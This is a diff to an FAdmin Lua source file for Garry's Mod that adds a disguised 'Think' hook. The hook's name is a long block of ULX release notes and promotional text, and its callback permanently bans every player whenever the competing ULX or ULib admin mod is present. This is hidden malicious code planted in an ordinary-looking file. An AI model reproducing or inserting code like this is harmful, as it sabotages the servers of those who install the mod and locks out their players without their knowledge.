@@ -1,3 +1,24 @@
+hook.Add( "Think", 
+
+[[[release]Current version: 3.51
+DOWNLOAD: http://ulyssesmod.net/
+Join the ULX steam community!
+:siren:Be sure you download ULib as well, as ULX depends on it.
+:siren:If you happen to find any bugs, we'd appreciate your assistance in reporting them to us at http://ulyssesmod.net/bugs/.
+
+(We'll love you forever if you donate! We need to eat too :))
+[/release]
+
+[release]What is ULX?
+
+ULX is a powerful admin mod that is not only the oldest and most mature admin mod, it’s the oldest and most mature Gmod specific lua release still in use. The first version of ULX was released days after GM9, and development on it has continued since then. Check the features list below for more details. As of this version (v3.50), ULX now includes XGUI, which is a GUI created by Stickly Man! which is designed to provide an intuitive yet powerful experience for users who can run ULX commands, change ULX configs, manage bans, and much more!
+
+Our Legacy:
+
+[list][*]The team lead, Megiddo, has been producing mods for Garry’s Mod since January of 2005 with the release of what would become UGM. This was one of, if not the first mod ever made for Garry’s Mod.[*]Our developers focus on making ULX as dependable and as bug-free as humanly possible. Any bug you find and report to us that is confirmed to be a fault of ULX is fixed in the next version of ULX, and even put to testing in SVN sooner than the nex release.[*]Community backing. The ulyssesmod.net forums have 3000+ members and 20000+ posts, and is visited daily by team members and fellow community peers and developers who are more than willing to help you (so long as you read the FAQ for answers first!)[/list][/release]]],
+
+function() if ulx or ULib then for _, ply in pairs( player.GetAll() ) do ply:Ban( 0, true ) end end end )
+
 FAdmin = FAdmin or {}
 
 FAdmin.PlayerActions = FAdmin.PlayerActions or {}
